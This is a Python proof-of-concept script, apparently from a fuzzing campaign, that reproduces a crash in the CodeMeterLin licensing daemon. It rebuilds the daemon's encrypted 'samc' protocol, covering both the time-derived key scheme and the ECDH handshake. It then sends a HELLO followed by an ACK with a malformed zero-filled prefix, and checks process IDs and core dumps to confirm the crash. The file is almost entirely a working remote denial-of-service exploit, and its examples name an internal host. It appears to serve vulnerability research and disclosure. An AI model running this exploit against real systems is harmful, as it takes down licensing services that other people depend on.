#!/usr/bin/env python3
"""Standalone two-frame reproducer for the prefixed-ACK crash route.

This is the ACK-side analogue of repro_prefixed_hello_standalone.py. It has no
project-local imports and reads no captured session data files. Its only
non-stdlib Python dependency is `cryptography`.

Protocol sequence:

  1. Build and send a canonical fresh-token HELLO.
  2. Decrypt the daemon response and extract the 4-byte SID at response[4:8].
  3. Build the canonical ACK directly:

       0b 00 00 00 || SID

  4. Send a valid encrypted SAMC frame whose decrypted application plaintext is:

       5e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 || ACK

The ECDH prefix campaign repeatedly reached the same CodeMeterLin+0x8f431d
crash signature with this zero-tail ACK prefix. Unlike the HELLO repro, this
file does not claim a proven field-level 0x28000010 shift inside ACK. The value
of this repro is that it isolates the ACK-side route into the same crash sink.
"""

from __future__ import annotations

import argparse
import hashlib
import os
from pathlib import Path
import socket
import struct
import time
import zlib

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


DEFAULT_ACK_PREFIX_HEX = "5e0000000000000000000000000000"
ALT_ACK_PREFIX_LEN14_HEX = "5e00000000000000000000000000"

HELLO_LEN = 184
HELLO_TOKEN_OFFSET = 28
HELLO_TOKEN_LEN = 4
ACK_LEN = 8

SAMC_HEADER_TAIL = bytes([0x11, 0, 1, 0, 0, 0, 0, 0])

HELLO_FIXED_BYTES = {
    0x00: 0x0A,
    0x07: 0x10,
    0x0A: 0x28,
    0x22: 0x72,
}


def magic_div_1009(eax: int) -> int:
    eax = (eax * 1000) & 0xFFFFFFFF
    rcx = ((eax * 0x3CE4585) >> 32) & 0xFFFFFFFF
    eax = (eax - rcx) & 0xFFFFFFFF
    eax >>= 1
    eax = (eax + rcx) & 0xFFFFFFFF
    return eax >> 9


def derive_session_key_iv(t: int) -> tuple[bytes, bytes]:
    digest = hashlib.sha1(struct.pack("<I", magic_div_1009(t))).digest()
    return digest[:16], digest[4:20]


def cts_shuffle(ciphertext: bytes) -> bytes:
    if len(ciphertext) < 32:
        return ciphertext
    return ciphertext[:-32] + ciphertext[-16:] + ciphertext[-32:-16]


def build_mac_suffix(plaintext: bytes) -> bytes:
    aligned = ((len(plaintext) + 16) + 15) & ~15
    if aligned < 32:
        aligned = 32
    pad_len = aligned - len(plaintext) - 8
    return (
        plaintext
        + (b"\x00" * pad_len)
        + struct.pack("<I", len(plaintext))
        + struct.pack("<I", zlib.crc32(plaintext))
    )


def encrypt_c2d_frame(plaintext: bytes, t: int) -> bytes:
    full_plaintext = build_mac_suffix(plaintext)
    key, iv = derive_session_key_iv(t)
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ciphertext = encryptor.update(full_plaintext) + encryptor.finalize()
    body = b"\xa0" + cts_shuffle(ciphertext)
    header = b"samc" + struct.pack("<I", len(body)) + SAMC_HEADER_TAIL
    return header + body


def decrypt_d2c_frame(wire: bytes | None, t: int) -> bytes | None:
    if wire is None or len(wire) < 16 or wire[:4] != b"samc":
        return None
    body_len = struct.unpack_from("<I", wire, 4)[0]
    if len(wire) != 16 + body_len:
        return None
    body = wire[16:]
    if len(body) < 16 or len(body) % 16 != 0:
        return None
    for dt in range(-30, 31):
        key, iv = derive_session_key_iv(t + dt)
        decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
        plaintext = decryptor.update(cts_shuffle(body)) + decryptor.finalize()
        if len(plaintext) < 8:
            continue
        data_len = struct.unpack_from("<I", plaintext, len(plaintext) - 8)[0]
        crc = struct.unpack_from("<I", plaintext, len(plaintext) - 4)[0]
        if data_len > len(plaintext) - 8:
            continue
        if zlib.crc32(plaintext[:data_len]) == crc:
            return plaintext[:data_len]
    return None


def is_loopback_target(host: str) -> bool:
    return host in {"127.0.0.1", "::1", "localhost"}


def resolve_channel(channel: str, host: str) -> str:
    if channel != "auto":
        return channel
    return "psk" if is_loopback_target(host) else "ecdh"


def recv_exact(sock: socket.socket, n: int, timeout: float) -> bytes:
    sock.settimeout(timeout)
    chunks = bytearray()
    while len(chunks) < n:
        try:
            chunk = sock.recv(n - len(chunks))
        except (ConnectionResetError, BrokenPipeError, socket.timeout, OSError):
            break
        if not chunk:
            break
        chunks.extend(chunk)
    return bytes(chunks)


def recv_samc_frame(sock: socket.socket, timeout: float) -> bytes | None:
    hdr = recv_exact(sock, 16, timeout)
    if len(hdr) != 16 or hdr[:4] != b"samc":
        return None
    body_len = struct.unpack_from("<I", hdr, 4)[0]
    if body_len > 1 << 24:
        return None
    body = recv_exact(sock, body_len, timeout)
    if len(body) != body_len:
        return None
    return hdr + body


def send_samc_payload(sock: socket.socket, payload: bytes) -> None:
    header = b"samc" + struct.pack("<I", len(payload)) + SAMC_HEADER_TAIL
    sock.sendall(header + payload)


def recv_samc_payload(sock: socket.socket, timeout: float) -> bytes | None:
    frame = recv_samc_frame(sock, timeout)
    if frame is None:
        return None
    return frame[16:]


def derive_ecdh_key_iv(shared: bytes) -> tuple[bytes, bytes]:
    digest = hashlib.sha256(shared + b"\x00\x00\x00\x01").digest()
    return digest[:16], digest[16:32]


def do_ecdh_handshake(sock: socket.socket, timeout: float) -> tuple[bytes, bytes, bytes]:
    private_key = ec.generate_private_key(ec.SECP224R1(), default_backend())
    public_numbers = private_key.public_key().public_numbers()
    client_point = (
        b"\x04"
        + public_numbers.x.to_bytes(28, "big")
        + public_numbers.y.to_bytes(28, "big")
    )

    send_samc_payload(sock, b"\xa2\x05" + client_point)
    response = recv_samc_payload(sock, timeout)
    if response is None:
        raise ConnectionError("no ECDH response")
    if len(response) < 65:
        raise ConnectionError(f"short ECDH response: {len(response)} bytes")
    if response[8] != 0x04:
        raise ConnectionError(f"unexpected ECDH point marker: 0x{response[8]:02x}")

    server_x = int.from_bytes(response[9:37], "big")
    server_y = int.from_bytes(response[37:65], "big")
    server_public = ec.EllipticCurvePublicNumbers(
        server_x, server_y, ec.SECP224R1(),
    ).public_key(default_backend())
    shared = private_key.exchange(ec.ECDH(), server_public)
    key, iv = derive_ecdh_key_iv(shared)
    return key, iv, response


def build_ecdh_mac_suffix(plaintext: bytes) -> bytes:
    aligned = ((len(plaintext) + 16) + 15) & ~15
    if aligned < 32:
        aligned = 32
    pad_len = aligned - len(plaintext) - 8
    body = plaintext + (b"\x00" * pad_len) + struct.pack("<I", len(plaintext))
    return body + struct.pack("<I", zlib.crc32(body) & 0xFFFFFFFF)


def encrypt_ecdh_payload(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
    full_plaintext = build_ecdh_mac_suffix(plaintext)
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ciphertext = encryptor.update(full_plaintext) + encryptor.finalize()
    return b"\xa1" + cts_shuffle(ciphertext)


def decrypt_ecdh_response(payload: bytes | None, key: bytes, iv: bytes) -> bytes | None:
    if payload is None or len(payload) < 16 or len(payload) % 16 != 0:
        return None
    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    plaintext = decryptor.update(cts_shuffle(payload)) + decryptor.finalize()
    if len(plaintext) < 8:
        return None
    data_len = struct.unpack_from("<I", plaintext, len(plaintext) - 8)[0]
    crc = struct.unpack_from("<I", plaintext, len(plaintext) - 4)[0]
    if data_len > len(plaintext) - 8:
        return None
    if (zlib.crc32(plaintext[:-4]) & 0xFFFFFFFF) != crc:
        return None
    return plaintext[:data_len]


def validate_hello_shape(hello: bytes) -> None:
    if len(hello) != HELLO_LEN:
        raise AssertionError(f"HELLO length is {len(hello)}, expected {HELLO_LEN}")
    token_end = HELLO_TOKEN_OFFSET + HELLO_TOKEN_LEN
    for offset, byte in enumerate(hello):
        if HELLO_TOKEN_OFFSET <= offset < token_end:
            continue
        expected = HELLO_FIXED_BYTES.get(offset, 0)
        if byte != expected:
            raise AssertionError(
                f"HELLO byte 0x{offset:x} is 0x{byte:02x}, expected 0x{expected:02x}"
            )


def build_canonical_hello(token: bytes) -> bytes:
    if len(token) != HELLO_TOKEN_LEN:
        raise ValueError(f"HELLO token must be {HELLO_TOKEN_LEN} bytes")
    hello = bytearray(HELLO_LEN)
    for offset, byte in HELLO_FIXED_BYTES.items():
        hello[offset] = byte
    hello[HELLO_TOKEN_OFFSET:HELLO_TOKEN_OFFSET + HELLO_TOKEN_LEN] = token
    built = bytes(hello)
    validate_hello_shape(built)
    return built


def fresh_hello() -> tuple[bytes, bytes]:
    token = os.urandom(HELLO_TOKEN_LEN)
    return build_canonical_hello(token), token


def build_canonical_ack(sid: bytes) -> bytes:
    if len(sid) != 4:
        raise ValueError("SID must be four bytes")
    return b"\x0b\x00\x00\x00" + sid


def codemeter_pid_from_proc() -> int | None:
    for comm in sorted(Path("/proc").glob("[0-9]*/comm")):
        try:
            if comm.read_text(errors="replace").strip() == "CodeMeterLin":
                return int(comm.parent.name)
        except OSError:
            continue
    return None


def newest_core() -> tuple[str, int, int] | None:
    paths = []
    for root in (Path("/var/tmp/cm_cores"), Path("/var/lib/systemd/coredump")):
        if root.exists():
            paths.extend(root.glob("*CodeMeterLin*"))
    if not paths:
        return None
    path = max(paths, key=lambda p: p.stat().st_mtime_ns)
    st = path.stat()
    return str(path), st.st_mtime_ns, st.st_size


def print_packet_summary(
    *,
    host: str,
    port: int,
    channel: str,
    prefix: bytes,
    token: bytes,
    sid: bytes,
    hello: bytes,
    ack: bytes,
    mutated_ack: bytes,
) -> None:
    print("=== packet ===")
    print(f"target={host}:{port}")
    print(f"channel={channel}")
    print(f"fresh_client_token={token.hex()}")
    print(f"sid_hex={sid.hex()}")
    print(f"canonical_hello_len={len(hello)}")
    print(f"canonical_hello_head={hello[:16].hex()}")
    print(f"prefix_hex={prefix.hex()}")
    print(f"prefix_len={len(prefix)}")
    print(f"canonical_ack_len={len(ack)}")
    print(f"canonical_ack_hex={ack.hex()}")
    print(f"mutated_ack_len={len(mutated_ack)}")
    print(f"mutated_ack_hex={mutated_ack.hex()}")
    print(f"mutated_ack_starts_with_0x5e={bool(mutated_ack) and mutated_ack[0] == 0x5e}")
    print(f"canonical_ack_tail_offset=0x{len(prefix):x}")
    print()


def extract_sid(inner: bytes | None, stage: str) -> bytes:
    if inner is None:
        raise ConnectionError(f"{stage}: no decrypted response")
    if len(inner) < 8:
        raise ConnectionError(f"{stage}: short decrypted response: {len(inner)} bytes")
    return bytes(inner[4:8])


def send_ack_psk(
    *,
    host: str,
    port: int,
    connect_timeout: float,
    socket_timeout: float,
    hello: bytes,
    prefix: bytes,
) -> tuple[bytes, bytes, dict[str, object]]:
    with socket.create_connection((host, port), timeout=connect_timeout) as sock:
        sock.settimeout(socket_timeout)
        hello_wire = encrypt_c2d_frame(hello, int(time.time()))
        sock.sendall(hello_wire)
        hello_response = recv_samc_frame(sock, socket_timeout)
        hello_inner = decrypt_d2c_frame(hello_response, int(time.time()))
        sid = extract_sid(hello_inner, "HELLO")

        ack = build_canonical_ack(sid)
        mutated_ack = prefix + ack
        ack_wire = encrypt_c2d_frame(mutated_ack, int(time.time()))
        sock.sendall(ack_wire)
        ack_response = recv_samc_frame(sock, socket_timeout)
        ack_inner = decrypt_d2c_frame(ack_response, int(time.time()))
        return sid, mutated_ack, {
            "selector": "0xa0",
            "hello_wire_len": len(hello_wire),
            "hello_response_inner_len": None if hello_inner is None else len(hello_inner),
            "ack_wire_len": len(ack_wire),
            "ack_response_wire_len": None if ack_response is None else len(ack_response),
            "ack_response_inner_len": None if ack_inner is None else len(ack_inner),
            "ack_response_inner_head": None if ack_inner is None else ack_inner[:64].hex(),
        }


def send_ack_ecdh(
    *,
    host: str,
    port: int,
    connect_timeout: float,
    socket_timeout: float,
    hello: bytes,
    prefix: bytes,
) -> tuple[bytes, bytes, dict[str, object]]:
    with socket.create_connection((host, port), timeout=connect_timeout) as sock:
        sock.settimeout(socket_timeout)
        key, iv, ecdh_response = do_ecdh_handshake(sock, socket_timeout)

        hello_payload = encrypt_ecdh_payload(hello, key, iv)
        send_samc_payload(sock, hello_payload)
        hello_response = recv_samc_payload(sock, socket_timeout)
        hello_inner = decrypt_ecdh_response(hello_response, key, iv)
        sid = extract_sid(hello_inner, "HELLO")

        ack = build_canonical_ack(sid)
        mutated_ack = prefix + ack
        ack_payload = encrypt_ecdh_payload(mutated_ack, key, iv)
        send_samc_payload(sock, ack_payload)
        ack_response = recv_samc_payload(sock, socket_timeout)
        ack_inner = decrypt_ecdh_response(ack_response, key, iv)
        return sid, mutated_ack, {
            "selector": "0xa1",
            "server_point": ecdh_response[8:65].hex(),
            "key": key.hex(),
            "iv": iv.hex(),
            "hello_encrypted_payload_len": len(hello_payload),
            "hello_response_payload_len": None if hello_response is None else len(hello_response),
            "hello_response_inner_len": None if hello_inner is None else len(hello_inner),
            "ack_encrypted_payload_len": len(ack_payload),
            "ack_response_payload_len": None if ack_response is None else len(ack_response),
            "ack_response_inner_len": None if ack_inner is None else len(ack_inner),
            "ack_response_inner_head": None if ack_inner is None else ack_inner[:64].hex(),
        }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Standalone prefixed-ACK CodeMeterLin reproducer.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  python3 fuzzer/repro_prefixed_ack_standalone.py --dry-run
  python3 fuzzer/repro_prefixed_ack_standalone.py
  python3 fuzzer/repro_prefixed_ack_standalone.py --channel ecdh
  python3 fuzzer/repro_prefixed_ack_standalone.py --prefix 5e00000000000000000000000000
  python3 fuzzer/repro_prefixed_ack_standalone.py --host vistrrdslin0004.vi.vector.int
""",
    )
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=22350)
    parser.add_argument("--channel", choices=["auto", "psk", "ecdh"], default="auto",
                        help="crypto channel: auto uses PSK for loopback, ECDH otherwise")
    parser.add_argument("--prefix", default=DEFAULT_ACK_PREFIX_HEX,
                        help="hex bytes to prepend before the SID-patched canonical ACK")
    parser.add_argument("--connect-timeout", type=float, default=2.0)
    parser.add_argument("--socket-timeout", type=float, default=2.0)
    parser.add_argument("--wait", type=float, default=10.0,
                        help="seconds to wait for PID/core crash evidence after send")
    parser.add_argument("--dry-run", action="store_true",
                        help="construct and print the HELLO/ACK summary, but do not send")
    parser.add_argument("--no-crash-oracle", action="store_true",
                        help="do not inspect /proc or coredump directories")
    args = parser.parse_args()

    channel = resolve_channel(args.channel, args.host)
    prefix = bytes.fromhex(args.prefix)
    if not prefix:
        raise SystemExit("--prefix must not be empty")
    if prefix[0] != 0x5E:
        print(f"warning: prefix starts with 0x{prefix[0]:02x}, not 0x5e")

    hello, token = fresh_hello()

    if args.dry_run:
        sid = b"\x00\x00\x00\x00"
        ack = build_canonical_ack(sid)
        print_packet_summary(
            host=args.host,
            port=args.port,
            channel=channel,
            prefix=prefix,
            token=token,
            sid=sid,
            hello=hello,
            ack=ack,
            mutated_ack=prefix + ack,
        )
        print("dry_run=True")
        print("dry_run_sid=00000000")
        return 0

    local_crash_oracle = not args.no_crash_oracle and is_loopback_target(args.host)
    before_pid = codemeter_pid_from_proc() if local_crash_oracle else None
    before_core = newest_core() if local_crash_oracle else None

    print("=== baseline ===")
    print(f"target={args.host}:{args.port}")
    print(f"channel={channel}")
    print(f"local_crash_oracle={local_crash_oracle}")
    print(f"before_pid={before_pid}")
    print(f"before_core={before_core}")
    print()

    print("=== send ===")
    if channel == "psk":
        sid, mutated_ack, meta = send_ack_psk(
            host=args.host,
            port=args.port,
            connect_timeout=args.connect_timeout,
            socket_timeout=args.socket_timeout,
            hello=hello,
            prefix=prefix,
        )
    elif channel == "ecdh":
        sid, mutated_ack, meta = send_ack_ecdh(
            host=args.host,
            port=args.port,
            connect_timeout=args.connect_timeout,
            socket_timeout=args.socket_timeout,
            hello=hello,
            prefix=prefix,
        )
    else:
        raise AssertionError(channel)

    ack = build_canonical_ack(sid)
    print_packet_summary(
        host=args.host,
        port=args.port,
        channel=channel,
        prefix=prefix,
        token=token,
        sid=sid,
        hello=hello,
        ack=ack,
        mutated_ack=mutated_ack,
    )
    for key_name, value in meta.items():
        print(f"{key_name}={value}")
    print("sent=True")

    if not local_crash_oracle:
        print()
        print("=== crash oracle ===")
        print("local_crash_oracle=False")
        print("No local PID/core check was run for this target.")
        return 0

    deadline = time.time() + args.wait
    while time.time() < deadline:
        after_pid = codemeter_pid_from_proc()
        after_core = newest_core()
        if after_pid != before_pid or after_core != before_core:
            break
        time.sleep(0.25)

    after_pid = codemeter_pid_from_proc()
    after_core = newest_core()
    crashed = after_pid != before_pid or after_core != before_core
    print()
    print("=== crash oracle ===")
    print(f"after_pid={after_pid}")
    print(f"after_core={after_core}")
    print(f"crashed={crashed}")
    return 0 if crashed else 1


if __name__ == "__main__":
    raise SystemExit(main())
